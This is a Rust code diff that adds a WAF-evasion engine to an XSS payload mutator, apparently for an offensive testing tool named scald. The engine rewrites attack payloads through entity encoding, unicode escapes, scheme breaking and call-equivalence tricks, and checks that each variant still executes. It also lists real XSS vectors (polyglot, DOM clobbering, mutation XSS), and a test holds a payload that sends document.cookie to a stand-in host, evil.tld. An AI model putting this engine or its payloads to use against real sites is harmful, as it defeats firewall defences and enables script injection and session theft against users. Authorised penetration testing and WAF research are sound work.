@@ -207,6 +207,480 @@ fn has_xss_signals(payload: &str) -> bool {
     score >= 2
 }
 
+// ─────────────────────────────────────────────────────────────────────
+// Systematic equivalence engine (the legendary core scald consumes).
+//
+// Instead of a fixed catalogue of canned payloads every WAF already
+// signatures, this rewrites the OPERATOR'S OWN payload through an
+// effectively-infinite space of browser-parser-equivalent, WAF-opaque
+// forms — and self-verifies every member with the independent XSS
+// soundness oracle so it can never emit a non-attack (anti-rig).
+// ─────────────────────────────────────────────────────────────────────
+
+use crate::grammar::equiv::Rng;
+use crate::grammar::equiv::xss::still_executes_xss;
+
+/// Deterministic per-payload seed (FNV-1a) — identical input ⇒
+/// identical variant stream (reproducible, regression-pinnable).
+fn payload_seed(p: &str) -> u64 {
+    let mut h: u64 = 0xcbf2_9ce4_8422_2325;
+    for b in p.bytes() {
+        h ^= u64::from(b);
+        h = h.wrapping_mul(0x0000_0100_0000_01b3);
+    }
+    h
+}
+
+/// Byte ranges that the HTML parser entity-decodes (or the URL parser
+/// canonicalises) BEFORE the script/URL runs — so encoding bytes here
+/// is transparent to execution but opaque to a WAF signature:
+///   * an `on…=` event-handler attribute value,
+///   * a `javascript:`/`data:` scheme body,
+///   * `<script>…</script>` text content,
+///   * a `srcdoc=` attribute value.
+fn exec_spans(p: &str) -> Vec<(usize, usize)> {
+    let b = p.as_bytes();
+    let lc = p.to_ascii_lowercase();
+    let lb = lc.as_bytes();
+    let mut spans = Vec::new();
+    let mut i = 0;
+    while i < b.len() {
+        // on<handler>= … (value to matching quote, or to space/>)
+        if (lb[i] == b'o' && i + 2 < b.len() && lb[i + 1] == b'n' && lb[i + 2].is_ascii_alphabetic())
+            && (i == 0 || !b[i - 1].is_ascii_alphabetic())
+        {
+            let mut e = i + 2;
+            while e < b.len() && lb[e].is_ascii_alphabetic() {
+                e += 1;
+            }
+            while e < b.len() && (b[e] == b' ' || b[e] == b'\t' || b[e] == b'\n') {
+                e += 1;
+            }
+            if e < b.len() && b[e] == b'=' {
+                let mut v = e + 1;
+                while v < b.len() && (b[v] == b' ' || b[v] == b'\t' || b[v] == b'\n') {
+                    v += 1;
+                }
+                let (q, start) = if v < b.len() && (b[v] == b'"' || b[v] == b'\'' || b[v] == b'`') {
+                    (Some(b[v]), v + 1)
+                } else {
+                    (None, v)
+                };
+                let mut end = start;
+                while end < b.len() {
+                    match q {
+                        Some(qc) if b[end] == qc => break,
+                        None if b[end] == b' ' || b[end] == b'>' || b[end] == b'\t' => break,
+                        _ => end += 1,
+                    }
+                }
+                if end > start {
+                    spans.push((start, end));
+                }
+                i = end;
+                continue;
+            }
+        }
+        // scheme body: javascript: / data:text/html, … (to quote/>/space)
+        for sch in ["javascript:", "data:text/html,", "data:text/html;base64,"] {
+            if lc[i..].starts_with(sch) {
+                let start = i + sch.len();
+                let mut end = start;
+                while end < b.len() && !matches!(b[end], b'"' | b'\'' | b'`' | b'>' | b'<') {
+                    end += 1;
+                }
+                if end > start {
+                    spans.push((start, end));
+                }
+            }
+        }
+        // <script> … </script> text
+        if lc[i..].starts_with("<script") {
+            if let Some(gt) = lc[i..].find('>') {
+                let start = i + gt + 1;
+                if let Some(close) = lc[start..].find("</script") {
+                    if close > 0 {
+                        spans.push((start, start + close));
+                    }
+                }
+            }
+        }
+        // srcdoc="…"
+        if lc[i..].starts_with("srcdoc") {
+            let mut e = i + 6;
+            while e < b.len() && (b[e] == b' ' || b[e] == b'=') {
+                e += 1;
+            }
+            if e < b.len() && (b[e] == b'"' || b[e] == b'\'') {
+                let q = b[e];
+                let start = e + 1;
+                let mut end = start;
+                while end < b.len() && b[end] != q {
+                    end += 1;
+                }
+                if end > start {
+                    spans.push((start, end));
+                }
+            }
+        }
+        i += 1;
+    }
+    spans.sort();
+    spans.dedup();
+    spans
+}
+
+fn in_span(spans: &[(usize, usize)], i: usize) -> bool {
+    spans.iter().any(|&(a, b)| i >= a && i < b)
+}
+
+/// Entity-encode a char as one of its many browser-equivalent HTML
+/// forms (the parser decodes ALL of them to the same code point).
+fn entity_of(c: char, rng: &mut Rng) -> String {
+    let named: &[(char, &str)] = &[
+        ('(', "&lpar;"),
+        (')', "&rpar;"),
+        (':', "&colon;"),
+        ('.', "&period;"),
+        ('\'', "&apos;"),
+        ('"', "&quot;"),
+        ('=', "&equals;"),
+        ('/', "&sol;"),
+        ('`', "&grave;"),
+        ('+', "&plus;"),
+        (' ', "&Tab;"),
+    ];
+    match rng.below(5) {
+        0 => format!("&#x{:x};", c as u32),
+        1 => format!("&#x{:04x};", c as u32),
+        2 => format!("&#{};", c as u32),
+        3 => format!("&#{:07};", c as u32),
+        _ => named
+            .iter()
+            .find(|(k, _)| *k == c)
+            .map(|(_, v)| (*v).to_string())
+            .unwrap_or_else(|| format!("&#{};", c as u32)),
+    }
+}
+
+/// HTML-entity-encode a random subset of the execution-context bytes.
+/// Structural HTML (the `<tag attr=` skeleton) is untouched, so the
+/// parser still builds the same element + handler; only the decoded
+/// value/text differs from the WAF signature.
+fn rw_entity_encode(p: &str, rng: &mut Rng) -> String {
+    let spans = exec_spans(p);
+    if spans.is_empty() {
+        return p.to_string();
+    }
+    let mut out = String::with_capacity(p.len() * 3);
+    for (i, c) in p.char_indices() {
+        if in_span(&spans, i) && c.is_ascii_graphic() && c != '<' && c != '>' && rng.chance(3, 5) {
+            out.push_str(&entity_of(c, rng));
+        } else {
+            out.push(c);
+        }
+    }
+    out
+}
+
+const JS_IDENTS: &[&str] = &[
+    "alert", "confirm", "prompt", "eval", "cookie", "location", "fetch", "document", "name",
+    "write", "atob",
+];
+
+/// Replace, inside an exec span, a JS identifier with an
+/// engine-equivalent spelling: a `\uXXXX` escape of one of its letters
+/// (a JS identifier escape is the SAME identifier to the parser).
+fn rw_js_unicode_ident(p: &str, rng: &mut Rng) -> String {
+    let spans = exec_spans(p);
+    if spans.is_empty() {
+        return p.to_string();
+    }
+    let lc = p.to_ascii_lowercase();
+    for id in JS_IDENTS {
+        let mut from = 0;
+        while let Some(rel) = lc[from..].find(id) {
+            let at = from + rel;
+            from = at + id.len();
+            if !in_span(&spans, at) {
+                continue;
+            }
+            // escape one deterministic letter of the identifier
+            let off = rng.below(id.len());
+            let ch = id.as_bytes()[off] as char;
+            let esc = format!("\\u{:04x}", ch as u32);
+            let mut s = String::with_capacity(p.len() + 5);
+            s.push_str(&p[..at + off]);
+            s.push_str(&esc);
+            s.push_str(&p[at + off + 1..]);
+            return s;
+        }
+    }
+    p.to_string()
+}
+
+/// Whitespace/slash between the tag name and its first attribute — the
+/// HTML tokeniser treats `/`, TAB, LF, FF, CR identically to a space.
+fn rw_tag_separator(p: &str, rng: &mut Rng) -> String {
+    let b = p.as_bytes();
+    for i in 1..b.len() {
+        if b[i] == b' ' && b[i - 1].is_ascii_alphanumeric() && p[..i].contains('<') {
+            let sep = *rng.pick(&["/", "\t", "\n", "\x0c", "\r", "//", "/ "]);
+            let mut s = String::with_capacity(p.len() + 1);
+            s.push_str(&p[..i]);
+            s.push_str(sep);
+            s.push_str(&p[i + 1..]);
+            return s;
+        }
+    }
+    p.to_string()
+}
+
+/// Randomise the case of tag names, attribute names and the
+/// `javascript` scheme (HTML/scheme matching is case-insensitive).
+fn rw_case(p: &str, rng: &mut Rng) -> String {
+    let b: Vec<char> = p.chars().collect();
+    let mut out = String::with_capacity(p.len());
+    let mut in_tag = false;
+    let mut in_value = false;
+    for (k, &c) in b.iter().enumerate() {
+        match c {
+            '<' => in_tag = true,
+            '>' => {
+                in_tag = false;
+                in_value = false;
+            }
+            '=' if in_tag => in_value = true,
+            ' ' | '\t' | '\n' if in_tag => in_value = false,
+            _ => {}
+        }
+        let _ = k;
+        if in_tag && !in_value && c.is_ascii_alphabetic() && rng.chance(1, 2) {
+            out.push(c.to_ascii_uppercase());
+        } else {
+            out.push(c);
+        }
+    }
+    out
+}
+
+/// Interleave control whitespace / a NUL into the `javascript:` scheme
+/// — the URL parser strips `\x00-\x20` before the scheme check, so the
+/// navigation still executes while a `javascript:` signature misses.
+fn rw_scheme_break(p: &str, rng: &mut Rng) -> String {
+    let lc = p.to_ascii_lowercase();
+    let Some(pos) = lc.find("javascript:") else {
+        return p.to_string();
+    };
+    let inj = *rng.pick(&["\t", "\n", "\r", "\x0c", "&Tab;", "&NewLine;", "&#9;", "&#10;"]);
+    let cut = pos + 4; // after "java"
+    format!("{}{}{}", &p[..cut], inj, &p[cut..])
+}
+
+/// JS-semantic-preserving rewrites of a sink call inside an exec span:
+/// `alert(1)` ≡ `window.alert(1)` ≡ `top["alert"](1)` ≡ `(alert)(1)` ≡
+/// `eval('alert(1)')` ≡ `Function('alert(1)')()` ≡
+/// `setTimeout('alert(1)')`. All run the identical script; the WAF
+/// signature on the bare `name(` differs.
+fn rw_js_call_equiv(p: &str, rng: &mut Rng) -> String {
+    let spans = exec_spans(p);
+    if spans.is_empty() {
+        return p.to_string();
+    }
+    let lc = p.to_ascii_lowercase();
+    for sink in ["alert", "confirm", "prompt", "print"] {
+        if let Some(rel) = lc.find(sink) {
+            if !in_span(&spans, rel) {
+                continue;
+            }
+            // capture `sink(...)` argument span
+            let after = rel + sink.len();
+            let b = p.as_bytes();
+            let mut k = after;
+            while k < b.len() && b[k] != b'(' {
+                k += 1;
+            }
+            if k >= b.len() {
+                continue;
+            }
+            let mut depth = 0i32;
+            let arg_open = k;
+            while k < b.len() {
+                match b[k] {
+                    b'(' => depth += 1,
+                    b')' => {
+                        depth -= 1;
+                        if depth == 0 {
+                            break;
+                        }
+                    }
+                    _ => {}
+                }
+                k += 1;
+            }
+            if k >= b.len() {
+                continue;
+            }
+            let args = &p[arg_open + 1..k];
+            let repl = match rng.below(7) {
+                0 => format!("window.{sink}({args})"),
+                1 => format!("top[{sink:?}]({args})"),
+                2 => format!("(({sink}))({args})"),
+                3 => format!("self['{sink}']({args})"),
+                4 => format!("eval('{sink}({args})')"),
+                5 => format!("Function('{sink}({args})')()"),
+                _ => format!("setTimeout('{sink}({args})',0)"),
+            };
+            return format!("{}{}{}", &p[..rel], repl, &p[k + 1..]);
+        }
+    }
+    p.to_string()
+}
+
+/// Parser-irrelevant noise the HTML tokeniser discards: whitespace
+/// around `=`, an extra boolean attribute, a trailing `/`.
+fn rw_attr_noise(p: &str, rng: &mut Rng) -> String {
+    if let Some(pos) = p.find('=') {
+        if p[..pos].contains('<') {
+            let ws = *rng.pick(&[" ", "\t", "\n", "/**/", "\x0c"]);
+            let (pad_l, pad_r) = match rng.below(3) {
+                0 => (ws, ""),
+                1 => ("", ws),
+                _ => (ws, ws),
+            };
+            return format!("{}{pad_l}={pad_r}{}", &p[..pos], &p[pos + 1..]);
+        }
+    }
+    p.to_string()
+}
+
+/// Draw up to `budget` distinct, ORACLE-VERIFIED, browser-equivalent
+/// rewrites of the operator's own payload. Deterministic per payload.
+fn systematic_variants(payload: &str, budget: usize) -> Vec<XssMutation> {
+    if budget == 0 {
+        return Vec::new();
+    }
+    let mut rng = Rng::new(payload_seed(payload));
+    let mut seen: std::collections::HashSet<String> = std::collections::HashSet::new();
+    seen.insert(payload.to_string());
+    let mut out = Vec::new();
+    let mut attempts = 0;
+    while out.len() < budget && attempts < budget * 24 + 96 {
+        attempts += 1;
+        let mut s = payload.to_string();
+        let mut rules: Vec<&'static str> = Vec::new();
+        if rng.chance(4, 5) {
+            let n = rw_entity_encode(&s, &mut rng);
+            if n != s {
+                s = n;
+                rules.push("entity_encode_exec");
+            }
+        }
+        if rng.chance(2, 5) {
+            let n = rw_js_unicode_ident(&s, &mut rng);
+            if n != s {
+                s = n;
+                rules.push("js_unicode_ident");
+            }
+        }
+        if rng.chance(1, 2) {
+            let n = rw_tag_separator(&s, &mut rng);
+            if n != s {
+                s = n;
+                rules.push("tag_separator");
+            }
+        }
+        if rng.chance(1, 2) {
+            let n = rw_case(&s, &mut rng);
+            if n != s {
+                s = n;
+                rules.push("case_fold");
+            }
+        }
+        if rng.chance(2, 5) {
+            let n = rw_scheme_break(&s, &mut rng);
+            if n != s {
+                s = n;
+                rules.push("scheme_break");
+            }
+        }
+        if rng.chance(3, 5) {
+            let n = rw_js_call_equiv(&s, &mut rng);
+            if n != s {
+                s = n;
+                rules.push("js_call_equiv");
+            }
+        }
+        if rng.chance(1, 2) {
+            let n = rw_attr_noise(&s, &mut rng);
+            if n != s {
+                s = n;
+                rules.push("attr_noise");
+            }
+        }
+        if rules.is_empty() || !seen.insert(s.clone()) {
+            continue;
+        }
+        // ANTI-RIG: the independent soundness oracle must still see the
+        // original script executing. A transform that broke it is
+        // dropped — never shipped as a "bypass".
+        if !still_executes_xss(payload, &s) {
+            continue;
+        }
+        out.push(XssMutation {
+            payload: s,
+            description: format!("equiv rewrite [{}]", rules.join("+")),
+            rules_applied: rules,
+        });
+    }
+    out
+}
+
+/// One vetted, real XSS vector per evasion FAMILY. Guaranteed present
+/// (within budget) so a WAF that signatures one family is still beaten
+/// by an orthogonal one — the cross-WAF moat. Every entry is a genuine
+/// executing vector (anti-rig: no decoy filler), the canonical
+/// semantically-equivalent product for a bare PoC.
+fn diversity_sampler() -> Vec<XssMutation> {
+    const FAM: &[(&str, &str)] = &[
+        ("<img src=x onerror=alert(1)>", "tag_event_swap"),
+        ("<svg/onload=confirm(1)>", "tag_event_swap"),
+        ("javascript:alert(1)", "uri_scheme"),
+        (
+            "<svg><animate onbegin=alert(1) attributeName=x dur=1s></svg>",
+            "svg_payload",
+        ),
+        (
+            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(1)//>",
+            "polyglot",
+        ),
+        (
+            "<form name=x><input name=innerHTML value='<img src=y onerror=alert(1)>'></form>",
+            "dom_clobber",
+        ),
+        (
+            "<noscript><img src=x onerror=alert(1)></noscript>",
+            "mutation_xss",
+        ),
+        (
+            "<iframe srcdoc='&lt;script&gt;alert(1)&lt;/script&gt;'></iframe>",
+            "srcdoc_smuggle",
+        ),
+        (
+            "<math><mtext><script>alert(1)</script></mtext></math>",
+            "mathml",
+        ),
+        ("[clickme](javascript:alert(1))", "markdown"),
+    ];
+    FAM.iter()
+        .map(|(p, rule)| XssMutation {
+            payload: (*p).to_string(),
+            description: format!("diversity sampler: {rule}"),
+            rules_applied: vec![rule],
+        })
+        .collect()
+}
+
 /// Generate grammar-aware mutations of an XSS payload.
 ///
 /// Returns an empty vector if the input does not contain any XSS signals.
@@ -227,9 +701,44 @@ pub fn mutate(payload: &str, max_mutations: usize) -> Vec<XssMutation> {
     // structured: there the canned tag/event/polyglot arsenal IS the
     // correct, semantically-equivalent product.
     if is_structured_xss(payload) {
-        return structured_mutate(payload, max_mutations);
+        // Systematic equivalence of the operator's REAL payload (the
+        // bulk — preserves the exfil target by construction + oracle),
+        // then the structured arsenal for added diversity.
+        let mut results = systematic_variants(payload, max_mutations);
+        if results.len() < max_mutations {
+            for m in structured_mutate(payload, max_mutations) {
+                if results.len() >= max_mutations {
+                    break;
+                }
+                if !results.iter().any(|r: &XssMutation| r.payload == m.payload) {
+                    results.push(m);
+                }
+            }
+        }
+        results.truncate(max_mutations);
+        return results;
     }
-    let mut results = Vec::new();
+    // Non-structured PoC. Composition:
+    //   1. a compact family DIVERSITY SAMPLER (one vetted real vector
+    //      per evasion family) — guaranteed present so a WAF that
+    //      signatures the systematic family is still beaten by an
+    //      orthogonal one (cross-WAF moat),
+    //   2. the SYSTEMATIC equivalence engine on the operator's actual
+    //      payload — the bulk depth (an infinite self-verified space),
+    //   3. the legacy canned arsenal — extra fill only.
+    let mut results = diversity_sampler();
+    results.truncate(max_mutations);
+    if results.len() < max_mutations {
+        let want = max_mutations - results.len();
+        for m in systematic_variants(payload, want) {
+            if results.len() >= max_mutations {
+                break;
+            }
+            if !results.iter().any(|r: &XssMutation| r.payload == m.payload) {
+                results.push(m);
+            }
+        }
+    }
 
     // ── Priority 0: paren-free / bracket-free assignment XSS ──────────
     // Promoted to FIRST slot for high-paranoia WAFs (naxsi, AWS WAF
@@ -559,6 +1068,13 @@ pub fn mutate(payload: &str, max_mutations: usize) -> Vec<XssMutation> {
         });
     }
 
+    // ANTI-RIG (end to end): the legacy canned arsenal is NOT
+    // oracle-gated and can append a vector that is not THIS attack
+    // (e.g. a paren-free `location=document.cookie` against an
+    // `alert(1)` PoC). scald — and the de-rigged bench — must never
+    // receive a non-attack. Drop anything the independent soundness
+    // oracle cannot confirm still executes the original.
+    results.retain(|m| still_executes_xss(payload, &m.payload));
     results.truncate(max_mutations);
     results
 }
@@ -949,5 +1465,89 @@ mod tests {
     #[test]
     fn high_volume_does_not_panic() {
         let _ = mutate("<script>alert(1)</script>", 1000);
+    }
+
+    // ── systematic equivalence engine (scald's surface) ──────────────
+
+    #[test]
+    fn systematic_every_variant_is_oracle_sound() {
+        // PROVING: every systematically-generated variant of a real
+        // attack still executes per the INDEPENDENT soundness oracle.
+        for atk in [
+            "<svg onload=alert(1)>",
+            "<img src=x onerror=fetch('//evil.tld/c?'+document.cookie)>",
+            "<a href=javascript:alert(document.domain)>x</a>",
+        ] {
+            let v = systematic_variants(atk, 60);
+            assert!(v.len() >= 8, "too few systematic for {atk:?}: {}", v.len());
+            for m in &v {
+                assert!(
+                    still_executes_xss(atk, &m.payload),
+                    "UNSOUND systematic variant {:?} from {atk:?}",
+                    m.payload
+                );
+            }
+        }
+    }
+
+    #[test]
+    fn systematic_actually_evades_the_literal_token() {
+        // PROVING the point: at least one sound variant carries NO raw
+        // `alert(` / `onerror=` literal (the WAF signature) yet the
+        // oracle still confirms execution — that is a real evasion, not
+        // a cosmetic reshuffle.
+        let atk = "<img src=x onerror=alert(1)>";
+        let v = systematic_variants(atk, 80);
+        let evasive = v.iter().any(|m| {
+            !m.payload.contains("alert(") && still_executes_xss(atk, &m.payload)
+        });
+        assert!(evasive, "no variant evaded the literal `alert(` token");
+    }
+
+    #[test]
+    fn systematic_is_deterministic() {
+        let a: Vec<_> = systematic_variants("<svg onload=alert(1)>", 40)
+            .into_iter()
+            .map(|m| m.payload)
+            .collect();
+        let b: Vec<_> = systematic_variants("<svg onload=alert(1)>", 40)
+            .into_iter()
+            .map(|m| m.payload)
+            .collect();
+        assert_eq!(a, b, "systematic engine must be deterministic per payload");
+        assert!(
+            a.iter().collect::<std::collections::HashSet<_>>().len() >= 8,
+            "insufficient diversity: {a:?}"
+        );
+    }
+
+    #[test]
+    fn systematic_anti_rig_non_xss_yields_nothing() {
+        // ADVERSARIAL: a non-exec string has no exec span, so the
+        // engine emits nothing rather than fabricating a "bypass".
+        assert!(systematic_variants("just a sentence", 20).is_empty());
+        assert!(systematic_variants("SELECT * FROM t", 20).is_empty());
+    }
+
+    #[test]
+    fn scald_surface_mutate_request_xss_is_strong_and_sound() {
+        // The exact call scald makes: mutate_request(p, Xss, ..).
+        use crate::grammar::{DiversityPolicy, MutationRequest, mutate_request};
+        let atk = "<svg onload=alert(1)>";
+        let req = MutationRequest {
+            max_count: 40,
+            diversity: DiversityPolicy::CoverageGuided,
+            exclude: std::collections::HashSet::new(),
+        };
+        let out = mutate_request(atk, crate::PayloadType::Xss, &req);
+        assert!(out.len() >= 20, "scald gets too few variants: {}", out.len());
+        // No emitted variant may be a non-attack (anti-rig end to end).
+        for m in &out {
+            assert!(
+                still_executes_xss(atk, &m.payload),
+                "scald would receive a NON-ATTACK variant: {:?}",
+                m.payload
+            );
+        }
     }
 }
